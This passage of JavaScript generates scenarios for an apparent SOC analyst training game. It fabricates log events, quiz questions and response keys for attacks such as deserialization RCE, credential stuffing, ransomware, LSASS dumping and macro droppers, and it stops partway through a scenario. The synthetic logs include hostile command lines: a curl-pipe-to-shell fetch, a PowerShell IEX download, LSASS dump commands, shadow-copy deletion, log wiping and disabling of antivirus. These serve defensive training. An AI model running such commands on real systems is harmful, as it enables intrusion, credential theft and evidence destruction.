+  E.push(WEB(m+n*.1+1,{src_ip:a,method:'POST',uri:'/checkout',user:acct,user_agent:'okhttp/4.12',msg:'order placed: 3x laptop, total 0 BDT'},1));
+  return{events:E,questions:[{q:'Which account abused the coupon?',a:[acct]},{q:'Which coupon code?',a:[code]}],
+  required:[['revoke_sessions',acct],['create_ticket','*']],recommended:[['block_ip',a],['notify','*']],
+  intel:{[a]:'No reputation hits — residential IP.'},
+  story:`<b>${acct}</b> applied coupon <b>${code}</b> ${n} times; nothing in the design limited coupons to one use, so the cart dropped to 0 BDT and 3 laptops were ordered. No "hacking tool" was needed — it is a design flaw. Fix: threat-model business flows, server-side coupon limits, hold the order (Finance/Ops).`,
+  tags:['OWASP A06:2025','CWE-840 Business Logic Errors','CWE-799 Improper Control of Interaction Frequency'],hints:['sourcetype=web uri=/api/cart/apply-coupon* | stats count by user','Check the msg field of /checkout']}}},
+{id:'a07_stuff',cat:'OWASP',tag:'A07:2025 Authentication Failures',type:'Authentication failure — credential stuffing',name:'Credential stuffing on /login',
+ desc:'Username/password pairs leaked from other sites are tried at scale from many IPs; with no rate limit or MFA, some accounts are taken over.',
+ gen(c){const m=c.t(),ua='python-requests/2.31.0',ips=Array.from({length:25},()=>c.ip()),n=rnd(160,220),E=[];
+  for(let i=0;i<n;i++)E.push(WEB(m+i*.05,{src_ip:pick(ips),method:'POST',uri:'/login',status:401,user:pick(['mahi','rony','shuvo','priya','anik','tuli','bappy','keya'])+rnd(10,999)+'@mail.example',user_agent:ua,bytes:120},1));
+  const vic=[...CUST].sort(()=>R()-.5).slice(0,3);vic.forEach((v,i)=>{const ip=pick(ips);E.push(WEB(m+3+i*2,{src_ip:ip,method:'POST',uri:'/login',status:200,user:v.u,user_agent:ua},1));E.push(WEB(m+3.2+i*2,{src_ip:ip,uri:'/account/payment-methods',user:v.u,user_agent:ua},1))});
+  return{events:E,questions:[{q:'Which user_agent did the attack tool use?',a:[ua,'python-requests']},{q:'How many accounts were successfully taken over? (number)',num:3,tol:0}],
+  required:[['revoke_sessions',vic.map(v=>v.u)],['create_ticket','*']],recommended:[['notify','*']],intel:{},
+  story:`${n}+ failed logins came from ${ips.length} different IPs (so per-IP rules stayed quiet) but all used <b>${ua}</b>. Three real customers (${vic.map(v=>v.u).join(', ')}) reused leaked passwords and were logged into, then the attacker opened their saved payment methods. Fix: MFA, rate limiting / bot protection, breached-password checks; force resets for the three.`,
+  tags:['OWASP A07:2025','CWE-307 Improper Restriction of Excessive Auth Attempts','T1110.004 Credential Stuffing'],hints:['sourcetype=web uri=/login status=401 | stats count by user_agent','Same user_agent with status=200?']}}},
+{id:'a08_deser',cat:'OWASP',tag:'A08:2025 Software or Data Integrity Failures',type:'Integrity failure — insecure deserialization',name:'Java deserialization RCE',
+ desc:'The server trusts serialized objects sent by the client; a crafted object executes commands on the web server.',
+ gen(c){const a=c.ip(),m=c.t(),E=[];for(let i=0;i<4;i++)E.push(WEB(m+i*.2,{src_ip:a,method:'POST',uri:'/api/session/restore',status:i<3?500:200,cookie:'SESSION=rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTa'+hex(12),user_agent:'Java/17.0.2'},1));
+  const e=(d,cmd)=>E.push(ev(m+d,{sourcetype:'edr',event:'process_start',host:'SRV-WEB01',user:'tomcat',process:'sh',parent:'java',cmdline:cmd,hash:hex(64)},1));
+  e(.9,'sh -c id');e(1.1,`sh -c curl -s http://${a}/s.sh | sh`);e(1.5,'sh -c cat /opt/tomcat/conf/tomcat-users.xml');
+  E.push(ev(m+1.6,{sourcetype:'firewall',host:'FW-EDGE01',src_ip:'10.0.2.10',dest_ip:a,dest_port:80,direction:'outbound',action:'allowed',bytes:rnd(4000,12000)},1));
+  return{events:E,questions:[{q:'Which IP exploited the server?',a:[a]},{q:'Which account does the web server (and the shell) run as?',a:['tomcat']}],
+  required:[['isolate_host',['SRV-WEB01','10.0.2.10']],['block_ip',a],['create_ticket','*']],recommended:[['enrich_ip',a]],
+  intel:{[a]:'MALICIOUS — exploiting Java deserialization (ysoserial gadget chains).'},
+  story:`${a} sent a Java serialized object (base64 starts with <b>rO0AB</b>) in the SESSION cookie to /api/session/restore. The app deserialized it without checking integrity, and <b>java</b> spawned <b>sh</b> as tomcat — remote code execution. Fix: never deserialize untrusted data; sign/verify session data; patch libraries.`,
+  tags:['OWASP A08:2025','CWE-502 Deserialization of Untrusted Data','T1190 Exploit Public-Facing Application','T1059.004 Unix Shell'],hints:['sourcetype=edr host=SRV-WEB01 parent=java','Correlate the time with web requests to SRV-WEB01']}}},
+{id:'a09_logs',cat:'OWASP',tag:'A09:2025 Security Logging & Alerting Failures',type:'Logging failure — log tampering',name:'Web shell + logs wiped',
+ desc:'After getting in, the attacker deletes logs and stops auditing; the gap in logging hides what happened next.',
+ gen(c){const a=c.ip(),m=rnd(45,75),shell='/uploads/img_'+rnd(1000,9999)+'.php',E=[];
+  E.push(WEB(m-1,{src_ip:a,method:'POST',uri:'/api/profile/avatar',status:201,user:'cust_newbie',user_agent:UAS[0],msg:'uploaded '+shell.split('/').pop()},1));
+  E.push(WEB(m,{src_ip:a,uri:shell+'?cmd=id',user_agent:UAS[0]},1));
+  const e=(d,p,cmd)=>E.push(ev(m+d,{sourcetype:'edr',event:'process_start',host:'SRV-WEB01',user:'www-data',process:p,parent:'php-fpm',cmdline:cmd,hash:hex(64)},1));
+  e(.2,'sh','id');e(1,'sh','sudo systemctl stop auditd');e(1.3,'sh','rm -f /var/log/nginx/access.log /var/log/nginx/error.log');e(1.5,'sh','history -c');
+  const cut=m+1.3;return{events:E,drop:x=>x.sourcetype==='web'&&x._time>T(cut),questions:[{q:'What time (HH:MM) did SRV-WEB01 web logs stop?',time:cut},{q:'What is the web shell file name?',a:[shell,shell.split('/').pop()]}],
+  required:[['isolate_host',['SRV-WEB01','10.0.2.10']],['block_ip',a],['create_ticket','*']],recommended:[['enrich_ip',a],['notify','*']],
+  intel:{[a]:'MALICIOUS — web-shell operator infrastructure.'},
+  story:`${a} uploaded a PHP file disguised as an avatar (<b>${shell}</b>) and used it to run commands as www-data, then stopped auditd and deleted the nginx logs at <b>${fmtT(T(cut)).slice(0,5)}</b> — after that the SIEM sees nothing from the web server. Fix: ship logs off-host in real time, alert on missing log sources, validate uploads and never execute them.`,
+  tags:['OWASP A09:2025','CWE-778 Insufficient Logging','T1070.002 Clear Linux Logs','T1505.003 Web Shell'],hints:['Look at the histogram for sourcetype=web — when does it go flat?','sourcetype=edr host=SRV-WEB01 parent=php-fpm']}}},
+{id:'a10_except',cat:'OWASP',tag:'A10:2025 Mishandling of Exceptional Conditions',type:'Exceptional conditions — fail-open',name:'Auth error causes fail-open',
+ desc:'Malformed input crashes the auth check; instead of failing closed, the app lets the request through and leaks stack traces.',
+ gen(c){const a=c.ip(),m=c.t(),E=[];for(let i=0;i<rnd(30,45);i++)E.push(WEB(m+i*.05,{src_ip:a,method:'POST',uri:'/api/auth/verify',status:500,user_agent:'Go-http-client/1.1',msg:'java.lang.NullPointerException at AuthService.verify(AuthService.java:88)'},1));
+  E.push(WEB(m+3,{src_ip:a,uri:'/admin/dashboard',user_agent:'Go-http-client/1.1',msg:'auth-service timeout: allowing request'},1));E.push(WEB(m+3.5,{src_ip:a,uri:'/admin/users/export',bytes:rnd(700000,950000),user_agent:'Go-http-client/1.1'},1));
+  return{events:E,questions:[{q:'Which IP triggered the errors?',a:[a]},{q:'Which admin endpoint was used to export data?',a:['/admin/users/export']}],
+  required:[['block_ip',a],['create_ticket','*'],['notify','*']],recommended:[['enrich_ip',a]],
+  intel:{[a]:'SUSPICIOUS — fuzzing activity seen across several APIs.'},
+  story:`${a} fuzzed /api/auth/verify with malformed JSON, causing ${'NullPointerException'}s (stack traces leaked in responses). While the auth service was failing, the gateway "failed open" and served <b>/admin/dashboard</b> and <b>/admin/users/export</b> to an anonymous user. New in 2025 as A10. Fix: fail closed, central exception handling, no stack traces to clients.`,
+  tags:['OWASP A10:2025','CWE-636 Not Failing Securely','CWE-209 Error message info exposure'],hints:['sourcetype=web status=500 | stats count by src_ip','sourcetype=web uri=/admin* user=-']}}},
+{id:'fp_pentest',cat:'OWASP',fp:true,tag:'Benign',type:'Authorised penetration test',name:'Authorised external pentest',
+ desc:'Attack-looking traffic that is actually an approved penetration test — check announcements before blocking.',
+ gen(c){const p=c.ip(),id='PT-2026-'+rnd(10,99),m=c.t(),E=[];E.push(ev(rnd(1,8),{sourcetype:'email',sender:'ciso@company.local',recipient:'soc@company.local',subject:`${id}: external web pentest by SecureAudit Ltd from ${p}, 09:00–13:00 today — do not block`,verdict:'delivered'}));
+  ["1'+OR+'1'='1","1+UNION+SELECT+NULL--","../../etc/passwd","<script>alert(1)<\/script>"].forEach((x,i)=>E.push(WEB(m+i*.2,{src_ip:p,uri:'/products?id='+x,status:i?404:500,user_agent:'Mozilla/5.0 (pentest; SecureAudit)'})));
+  for(let i=0;i<rnd(28,40);i++)E.push(WEB(m+1+i*.05,{src_ip:p,uri:'/scan'+rnd(1,999),status:404,bytes:0,user_agent:'Mozilla/5.0 (pentest; SecureAudit)'}));
+  return{events:E,questions:[{q:'Which reference authorises this activity?',a:[id]},{q:'Source IP of the tester?',a:[p]}],
+  required:[['close_case','*']],recommended:[],forbidden:[['block_ip',p]],intel:{[p]:'No reputation hits. Registered to SecureAudit Ltd (security consultancy).'},
+  story:`The injection and scanning came from <b>${p}</b>, the approved pentester (<b>${id}</b>, announced by the CISO to soc@). Blocking it would break the test. Correct: verify the authorisation, document, close as false positive.`,tags:['Benign — authorised testing'],hints:['sourcetype=email | table _time, sender, subject']}}},
+{id:'fp_crawler',cat:'OWASP',fp:true,tag:'Benign',type:'Search-engine crawler',name:'Googlebot 404 burst',
+ desc:'A burst of 404s from a verified search-engine crawler following old links — noisy but harmless.',
+ gen(c){const p='66.249.66.'+rnd(1,200),m=c.t(),E=[];for(let i=0;i<rnd(35,50);i++)E.push(WEB(m+i*.08,{src_ip:p,uri:'/old-shop/item-'+rnd(1,800)+'.html',status:404,bytes:0,user_agent:'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'}));
+  return{events:E,questions:[{q:'Which crawler produced the 404s?',a:['googlebot']}],required:[['close_case','*']],recommended:[['enrich_ip',p]],forbidden:[['block_ip',p]],
+  intel:{[p]:'BENIGN — verified Googlebot (reverse DNS crawl-'+p.replace(/\./g,'-')+'.googlebot.com).'},
+  story:`The 404 flood came from <b>${p}</b>, a verified Googlebot crawling old URLs from the previous shop version. Blocking it would hurt search ranking. Close as false positive; optionally ask web team to add redirects.`,tags:['Benign — crawler'],hints:['Enrich the IP before acting']}}},
+
+/* ---------------- Identity ---------------- */
+{id:'id_spray',cat:'Identity',tag:'Identity',type:'Password spray',name:'VPN password spray',
+ desc:'One source tries one or two common passwords against many accounts to stay under lockout limits.',
+ gen(c){const a=c.ip(),m=c.t(),v=c.user(),us=[...Object.keys(PEOPLE),'admin','administrator','test','j.smith','helpdesk','guest'].sort(()=>R()-.5),E=[];
+  us.forEach((u,i)=>E.push(ev(m+i*.12,{sourcetype:'auth',event:'vpn_login',host:'VPN-GW01',user:u,src_ip:a,action:'failure',country:'NL',msg:'bad password'},1)));
+  E.push(ev(m+us.length*.12+.5,{sourcetype:'auth',event:'vpn_login',host:'VPN-GW01',user:v,src_ip:a,action:'success',country:'NL'},1));
+  return{events:E,questions:[{q:'Source IP of the spray?',a:[a]},{q:'Which account was compromised?',a:[v]}],
+  required:[['block_ip',a],['reset_password',v]],recommended:[['disable_user',v],['enrich_ip',a],['revoke_sessions',v]],
+  intel:{[a]:'MALICIOUS — password spraying against VPN gateways.'},
+  story:`${a} tried a common password once against ${us.length} accounts in ~2 minutes (a <b>spray</b>, not brute force — so per-user lockouts never triggered), then got in as <b>${v}</b> on the VPN. Fix: MFA on VPN, banned-password list.`,
+  tags:['T1110.003 Password Spraying','T1133 External Remote Services'],hints:['sourcetype=auth action=failure | stats dc(user) by src_ip','Any action=success from that IP?']}}},
+{id:'id_travel',cat:'Identity',tag:'Identity',type:'Impossible travel — account takeover',name:'Impossible travel login',
+ desc:'The same account logs in from two countries minutes apart — physically impossible, so one login is an attacker.',
+ gen(c){const u=c.user(),p=PEOPLE[u],a=c.ip(),cc=pick(['US','BR','DE']),m=c.t(),E=[];
+  E.push(ev(m,{sourcetype:'auth',event:'o365_login',host:'AzureAD',user:u,src_ip:p.ip,action:'success',country:'BD'},1));
+  E.push(ev(m+rnd(8,14),{sourcetype:'auth',event:'o365_login',host:'AzureAD',user:u,src_ip:a,action:'success',country:cc},1));
+  E.push(ev(m+rnd(16,20),{sourcetype:'auth',event:'file_download',host:'SharePoint',user:u,src_ip:a,action:'success',country:cc,msg:'Downloaded '+rnd(150,400)+' files'},1));
+  return{events:E,questions:[{q:'Which account was taken over?',a:[u]},{q:'From which country did the attacker log in?',a:[cc]}],
+  required:[['revoke_sessions',u],['reset_password',u],['block_ip',a]],recommended:[['enrich_ip',a]],
+  intel:{[a]:`SUSPICIOUS — anonymising VPS (${cc}).`},
+  story:`<b>${u}</b> logged in from the office (BD), then about 10 minutes later from <b>${cc}</b> (${a}) — impossible travel — and mass-downloaded SharePoint files. Revoke sessions first (a password reset alone doesn't kill existing tokens).`,
+  tags:['T1078.004 Valid Cloud Accounts','T1530 Data from Cloud Storage'],hints:['sourcetype=auth user="<user>" | table _time, src_ip, country, event','Is there a travel notice? (check email)']}}},
+{id:'fp_travel',cat:'Identity',fp:true,tag:'Benign',type:'Employee travelling (approved)',name:'Login from abroad — approved travel',
+ desc:'A login from another country by an employee who is legitimately travelling.',
+ gen(c){const u=c.user(),a=c.ip(),m=c.t(),E=[];E.push(ev(rnd(1,10),{sourcetype:'email',sender:'hr@company.local',recipient:'soc@company.local',subject:`Travel notice: ${u} in Singapore 2–6 Nov (approved by manager)`,verdict:'delivered'}));
+  E.push(ev(m,{sourcetype:'auth',event:'o365_login',host:'AzureAD',user:u,src_ip:a,action:'success',country:'SG',msg:'MFA: approved via authenticator app'}));
+  return{events:E,questions:[{q:'Which employee is travelling?',a:[u]}],required:[['close_case','*']],recommended:[['lookup_user',u],['enrich_ip',a]],forbidden:[['disable_user',u],['block_ip',a]],
+  intel:{[a]:'BENIGN — hotel Wi-Fi network, Singapore.'},story:`<b>${u}</b> logged in from Singapore with MFA, and HR had announced approved travel. Disabling the account would lock out a travelling employee. Close as false positive.`,tags:['Benign — approved travel'],hints:['sourcetype=email | table _time, sender, subject']}}},
+{id:'id_mfa',cat:'Identity',tag:'Identity',type:'MFA fatigue (push bombing)',name:'MFA push bombing',
+ desc:'The attacker has the password and spams MFA push prompts until the tired user taps "Approve".',
+ gen(c){const u=c.user(),a=c.ip(),cc=pick(['RU','VN','NG']),m=c.t(),n=rnd(10,16),E=[];
+  for(let i=0;i<n;i++)E.push(ev(m+i*.4,{sourcetype:'auth',event:'mfa_push',host:'AzureAD',user:u,src_ip:a,action:'denied',country:cc},1));
+  E.push(ev(m+n*.4+.3,{sourcetype:'auth',event:'mfa_push',host:'AzureAD',user:u,src_ip:a,action:'approved',country:cc},1));
+  E.push(ev(m+n*.4+.5,{sourcetype:'auth',event:'o365_login',host:'AzureAD',user:u,src_ip:a,action:'success',country:cc},1));
+  return{events:E,questions:[{q:'Which user was push-bombed?',a:[u]},{q:'How many MFA prompts were denied? (number)',num:n,tol:1}],
+  required:[['revoke_sessions',u],['reset_password',u],['block_ip',a]],recommended:[['notify','*'],['enrich_ip',a]],
+  intel:{[a]:`MALICIOUS — (${cc}) linked to MFA-fatigue campaigns.`},
+  story:`The attacker already had <b>${u}</b>'s password. ${n} MFA pushes were denied, then one was approved and the attacker logged in from ${cc}. Fix: number-matching MFA, limit pushes, talk to the user (Notify).`,
+  tags:['T1621 MFA Request Generation','T1078 Valid Accounts'],hints:['sourcetype=auth event=mfa_push | stats count by user, action']}}},
+{id:'id_privesc',cat:'Identity',tag:'Identity',type:'Privilege escalation — Domain Admins change',name:'Unexpected Domain Admins member',
+ desc:'A normal user account creates a new account and adds it to Domain Admins — a classic persistence/escalation step.',
+ gen(c){const u=c.user(['karim','nusrat','alice','sadia']),p=PEOPLE[u],na=pick(['svc_update','backup_adm','sql_maint']),m=c.t(),E=[];
+  E.push(ev(m,{sourcetype:'auth',event:'user_created',host:'SRV-DC01',user:u,target_user:na,src_ip:p.ip,action:'success',country:'BD'},1));
+  E.push(ev(m+.5,{sourcetype:'auth',event:'group_member_added',host:'SRV-DC01',user:u,target_user:na,group:'Domain Admins',src_ip:p.ip,action:'success',country:'BD'},1));
+  E.push(ev(m+3,{sourcetype:'auth',event:'windows_logon',host:'SRV-DC01',user:na,src_ip:p.ip,action:'success',country:'BD'},1));
+  return{events:E,questions:[{q:'Which account was added to Domain Admins?',a:[na]},{q:'Which user made the change?',a:[u]}],
+  required:[['disable_user',na],['isolate_host',[p.host,p.ip]],['reset_password',u]],recommended:[['lookup_user',u],['notify','*']],intel:{},
+  story:`<b>${u}</b> (${p.title} — not IT) created <b>${na}</b> and added it to Domain Admins from ${p.host}, with no change ticket. ${u}'s account/workstation is likely compromised. Disable the new admin, isolate the workstation, reset ${u}.`,
+  tags:['T1136.002 Create Domain Account','T1098.007 Additional Local/Domain Groups'],hints:['sourcetype=auth event=group_member_added','lookup_user — is this person in IT?']}}},
+{id:'fp_admin',cat:'Identity',fp:true,tag:'Benign',type:'Approved admin change',name:'New admin account — approved change',
+ desc:'IT adds a new administrator through an approved change ticket.',
+ gen(c){const na='adm_'+pick(['sumaiya','towhid','mehedi']),tk='CHG-'+rnd(3000,3999),m=c.t(),E=[];
+  E.push(ev(rnd(1,10),{sourcetype:'email',sender:'it-ops@company.local',recipient:'soc@company.local',subject:`${tk} approved: create admin account ${na} for new sysadmin (by rahim)`,verdict:'delivered'}));
+  E.push(ev(m,{sourcetype:'auth',event:'user_created',host:'SRV-DC01',user:'rahim',target_user:na,src_ip:PEOPLE.rahim.ip,action:'success',country:'BD'}));
+  E.push(ev(m+.4,{sourcetype:'auth',event:'group_member_added',host:'SRV-DC01',user:'rahim',target_user:na,group:'Domain Admins',src_ip:PEOPLE.rahim.ip,action:'success',country:'BD'}));
+  return{events:E,questions:[{q:'Which change ticket covers this?',a:[tk]}],required:[['close_case','*']],recommended:[['lookup_user','rahim']],forbidden:[['disable_user',na],['disable_user','rahim'],['isolate_host',['WS-03','10.0.1.13']]],intel:{},
+  story:`rahim (System Administrator) created <b>${na}</b> under approved change <b>${tk}</b>. Legitimate — close as false positive.`,tags:['Benign — approved change'],hints:['lookup_user rahim; check sourcetype=email']}}},
+{id:'id_kerb',cat:'Identity',tag:'Identity',type:'Kerberoasting',name:'Kerberoasting (RC4 service tickets)',
+ desc:'A user requests many service tickets with weak RC4 encryption to crack service-account passwords offline.',
+ gen(c){const u=c.user(),p=PEOPLE[u],m=c.t(),sp=['MSSQLSvc/sql01.company.local:1433','HTTP/intranet.company.local','CIFS/SRV-FILE01','MSSQLSvc/sql02.company.local:1433','HTTP/jira.company.local','exchangeMDB/mail01','FTP/ftp01','HOST/backup01','WSMAN/SRV-WEB02','TERMSRV/rds01'],n=rnd(7,10),E=[];
+  sp.slice(0,n).forEach((s,i)=>E.push(ev(m+i*.03,{sourcetype:'auth',event:'kerberos_tgs',host:'SRV-DC01',user:u,service:s,encryption:'RC4',src_ip:p.ip,action:'success',country:'BD'},1)));
+  return{events:E,questions:[{q:'Which user requested the tickets?',a:[u]},{q:'How many service tickets? (number)',num:n,tol:0}],
+  required:[['isolate_host',[p.host,p.ip]],['reset_password',u],['create_ticket','*']],recommended:[['notify','*']],intel:{},
+  story:`${p.host} (<b>${u}</b>) requested ${n} RC4 Kerberos service tickets in two seconds — typical of Rubeus/Impacket kerberoasting. The tickets can be cracked offline, so service-account passwords must be rotated (ticket to IT) and the workstation isolated.`,
+  tags:['T1558.003 Kerberoasting'],hints:['sourcetype=auth event=kerberos_tgs | stats dc(service) by user, encryption']}}},
+
+/* ---------------- Endpoint ---------------- */
+{id:'ep_ransom',cat:'Endpoint',tag:'Endpoint',type:'Ransomware',name:'Ransomware encryption',
+ desc:'Shadow copies are deleted, then files are mass-renamed with a new extension — encryption in progress.',
+ gen(c){const u=c.user(),p=PEOPLE[u],m=c.t(),ext=pick(['.locked','.crypt0','.bdlock']),pr=pick(['svch0st.exe','winupdate.exe']),h=hex(64),E=[];
+  const e=(d,f)=>E.push(ev(m+d,Object.assign({sourcetype:'edr',host:p.host,user:u,parent:pr,hash:h},f),1));
+  e(0,{event:'process_start',process:pr,parent:'explorer.exe',cmdline:'C:\\Users\\Public\\'+pr});e(.3,{event:'process_start',process:'vssadmin.exe',cmdline:'vssadmin.exe delete shadows /all /quiet'});e(.4,{event:'process_start',process:'wbadmin.exe',cmdline:'wbadmin delete catalog -quiet'});
+  const n=rnd(150,220);for(let i=0;i<n;i++)e(1+i*.02,{event:'file_rename',process:pr,cmdline:`C:\\Users\\${u}\\Documents\\${pick(['report','invoice','photo','budget','contract'])}_${hex(4)}.${pick(['docx','xlsx','pdf','jpg'])} -> *${ext}`});
+  return{events:E,questions:[{q:'Which host is being encrypted?',a:[p.host,p.ip]},{q:'What extension is appended to files?',a:[ext]},{q:'Name of the ransomware process?',a:[pr]}],
+  required:[['isolate_host',[p.host,p.ip]],['disable_user',u],['notify','*']],recommended:[['check_hash',h],['restore_backup',[p.host]]],
+  intel:{[h]:'MALICIOUS — 64/70 engines: Ransom.Win32.Generic'},
+  story:`<b>${pr}</b> on <b>${p.host}</b> deleted shadow copies and the backup catalog (so Windows can't restore), then renamed ${n} files to <b>*${ext}</b>. Ransomware = isolate immediately, disable the user, escalate to management, restore from clean backups.`,
+  tags:['T1490 Inhibit System Recovery','T1486 Data Encrypted for Impact'],hints:['sourcetype=edr event=file_rename | stats count by host, process']}}},
+{id:'ep_lsass',cat:'Endpoint',tag:'Endpoint',type:'Credential dumping (LSASS)',name:'LSASS memory dump',
+ desc:'A tool reads the memory of lsass.exe to steal password hashes and Kerberos tickets.',
+ gen(c){const u=c.user(),p=PEOPLE[u],m=c.t(),E=[];const v=R()<.5?{process:'rundll32.exe',cmdline:'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 664 C:\\Windows\\Temp\\lsass.dmp full'}:{process:'procdump64.exe',cmdline:'procdump64.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\ls.dmp'};
+  E.push(ev(m,Object.assign({sourcetype:'edr',event:'process_start',host:p.host,user:u,parent:'cmd.exe',hash:hex(64)},v),1));
+  return{events:E,questions:[{q:'Which host dumped LSASS?',a:[p.host,p.ip]},{q:'Which process performed the dump?',a:[v.process]}],
+  required:[['isolate_host',[p.host,p.ip]],['reset_password',u]],recommended:[['create_ticket','*'],['notify','*']],intel:{},
+  story:`<b>${v.process}</b> dumped lsass.exe memory on <b>${p.host}</b>. Every credential cached on that machine must be considered stolen — isolate, reset ${u} and any admin who logged on there.`,
+  tags:['T1003.001 LSASS Memory'],hints:['sourcetype=edr lsass']}}},
+{id:'ep_psexec',cat:'Endpoint',tag:'Endpoint',type:'Lateral movement (PsExec)',name:'PsExec lateral movement',
+ desc:'A compromised account uses PsExec to run commands on several other machines.',
+ gen(c){const u=c.user(['karim','nusrat','alice','bob']),p=PEOPLE[u],m=c.t(),tg=Object.values(PEOPLE).filter(x=>x!==p).sort(()=>R()-.5).slice(0,4).map(x=>x.host).concat(['SRV-FILE01']),E=[];
+  tg.forEach((h,i)=>E.push(ev(m+i*.6,{sourcetype:'edr',event:'service_install',host:h,user:u,process:'PSEXESVC.exe',parent:'services.exe',cmdline:`PSEXESVC.exe (from ${p.host}) cmd.exe /c whoami & net group "Domain Admins" /domain`,hash:hex(64)},1)));
+  return{events:E,questions:[{q:'Which account was used?',a:[u]},{q:'From which host did it start?',a:[p.host,p.ip]}],
+  required:[['isolate_host',[p.host,p.ip]],['disable_user',u]],recommended:[['lookup_user',u],['notify','*']],intel:{},
+  story:`<b>${u}</b> (${p.title}, not IT) pushed PSEXESVC to ${tg.length} machines from <b>${p.host}</b> and ran recon commands. Isolate the source host and disable the account.`,
+  tags:['T1569.002 Service Execution','T1021.002 SMB/Admin Shares'],hints:['sourcetype=edr process=PSEXESVC.exe | stats dc(host) by user']}}},
+{id:'fp_psexec',cat:'Endpoint',fp:true,tag:'Benign',type:'IT admin remote management',name:'PsExec by IT — approved',
+ desc:'IT uses PsExec for an approved software deployment.',
+ gen(c){const tk='CHG-'+rnd(4000,4999),m=c.t(),E=[];E.push(ev(rnd(1,10),{sourcetype:'email',sender:'it-ops@company.local',recipient:'soc@company.local',subject:`${tk}: rahim deploying VPN client update with PsExec to all workstations today`,verdict:'delivered'}));
+  Object.values(PEOPLE).filter(x=>x.host!=='WS-03').slice(0,5).forEach((x,i)=>E.push(ev(m+i*.5,{sourcetype:'edr',event:'service_install',host:x.host,user:'rahim',process:'PSEXESVC.exe',parent:'services.exe',cmdline:'PSEXESVC.exe (from WS-03) msiexec /i \\\\SRV-FILE01\\deploy\\vpnclient-5.2.msi /qn',hash:hex(64)})));
+  return{events:E,questions:[{q:'Which change ticket covers it?',a:[tk]}],required:[['close_case','*']],recommended:[['lookup_user','rahim']],forbidden:[['disable_user','rahim'],['isolate_host',['WS-03','10.0.1.13']]],intel:{},
+  story:`rahim (IT) used PsExec to install a VPN client update under <b>${tk}</b>. Legitimate — close as false positive (and consider excluding approved deployment tools in the rule).`,tags:['Benign — approved admin activity'],hints:['Check sourcetype=email and the cmdline']}}},
+{id:'ep_av',cat:'Endpoint',tag:'Endpoint',type:'Security tool tampering',name:'Defender disabled',
+ desc:'Someone turns off antivirus real-time protection — usually right before running malware.',
+ gen(c){const u=c.user(),p=PEOPLE[u],m=c.t(),E=[];E.push(ev(m,{sourcetype:'edr',event:'process_start',host:p.host,user:u,process:'powershell.exe',parent:'cmd.exe',cmdline:'powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true',hash:hex(64)},1));
+  E.push(ev(m+.2,{sourcetype:'edr',event:'process_start',host:p.host,user:u,process:'sc.exe',parent:'cmd.exe',cmdline:'sc stop WinDefend',hash:hex(64)},1));
+  E.push(ev(m+1,{sourcetype:'edr',event:'process_start',host:p.host,user:u,process:'AnyDesk.exe',parent:'cmd.exe',cmdline:'C:\\Users\\Public\\AnyDesk.exe --silent',hash:hex(64)},1));
+  return{events:E,questions:[{q:'On which host was Defender disabled?',a:[p.host,p.ip]},{q:'Which remote-access tool was launched afterwards?',a:['AnyDesk','AnyDesk.exe']}],
+  required:[['isolate_host',[p.host,p.ip]],['reset_password',u]],recommended:[['create_ticket','*'],['notify','*']],intel:{},
+  story:`Defender real-time protection was turned off on <b>${p.host}</b> and the service stopped, then <b>AnyDesk</b> was silently launched — a remote-access foothold. Isolate and investigate.`,
+  tags:['T1562.001 Disable or Modify Tools','T1219 Remote Access Software'],hints:['sourcetype=edr cmdline=*Disable*']}}},
+{id:'ep_miner',cat:'Endpoint',tag:'Endpoint',type:'Cryptomining',name:'Cryptominer on server',
+ desc:'A miner uses company CPU to mine cryptocurrency and connects to a mining pool (often port 3333).',
+ gen(c){const pool=pick(['pool.xmr-mine.example','stratum.coinpool.example']),pip=c.ip(),H=pick(['SRV-WEB01','SRV-FILE01']),HIP=H==='SRV-WEB01'?'10.0.2.10':'10.0.2.20',m=c.t(),h=hex(64),E=[];
+  E.push(ev(m,{sourcetype:'edr',event:'process_start',host:H,user:'www-data',process:'kworkerds',parent:'bash',cmdline:`/tmp/.k/kworkerds -o stratum+tcp://${pool}:3333 -u 48xYz…wallet --cpu-max-threads-hint=90`,hash:h},1));
+  E.push(ev(m+.05,{sourcetype:'dns',host:H,src_ip:HIP,query:pool,answer:pip},1));
+  for(let t=m+.1;t<120;t+=rnd(3,6))E.push(ev(t,{sourcetype:'firewall',host:'FW-EDGE01',src_ip:HIP,dest_ip:pip,dest_port:3333,direction:'outbound',action:'allowed',bytes:rnd(2000,6000)},1));
+  return{events:E,questions:[{q:'Which host is mining?',a:[H,HIP]},{q:'Which mining pool domain?',a:[pool]}],
+  required:[['isolate_host',[H,HIP]],['block_domain',pool]],recommended:[['block_ip',pip],['check_hash',h]],
+  intel:{[pool]:'Known Monero mining pool.',[h]:'MALICIOUS — CoinMiner.Linux.XMRig (renamed)',[pip]:'Mining pool endpoint'},
+  story:`An XMRig miner disguised as <b>kworkerds</b> runs on <b>${H}</b>, talking to <b>${pool}</b> on port 3333 (stratum). Miners often signal a bigger compromise (how did it get there?).`,
+  tags:['T1496 Resource Hijacking','T1036 Masquerading'],hints:['sourcetype=firewall dest_port=3333','Then sourcetype=edr host="<host>"']}}},
+{id:'ep_macro',cat:'Endpoint',tag:'Endpoint',type:'Malicious Office macro',name:'Macro document runs PowerShell',
+ desc:'A Word document with macros launches PowerShell to download the next stage.',
+ gen(c){const u=c.user(),p=PEOPLE[u],dom=pick(['docs-viewer.example','office-cdn-update.example']),snd='hr-payroll@'+pick(['salary-update.example','paygrade.example']),m=c.t(),E=[];
+  E.push(ev(m,{sourcetype:'email',sender:snd,recipient:u+'@company.local',subject:'Salary revision 2026 — please review',attachment:'Salary_Revision_2026.docm',verdict:'delivered'},1));
+  E.push(ev(m+rnd(3,9),{sourcetype:'edr',event:'process_start',host:p.host,user:u,process:'powershell.exe',parent:'winword.exe',cmdline:`powershell.exe -nop -w hidden IEX (New-Object Net.WebClient).DownloadString('http://${dom}/a.ps1')`,hash:hex(64)},1));
+  E.push(ev(m+9.1,{sourcetype:'dns',host:p.host,src_ip:p.ip,query:dom,answer:c.ip()},1));
+  return{events:E,questions:[{q:'Which user opened the document?',a:[u]},{q:'Which domain served the second stage?',a:[dom]}],
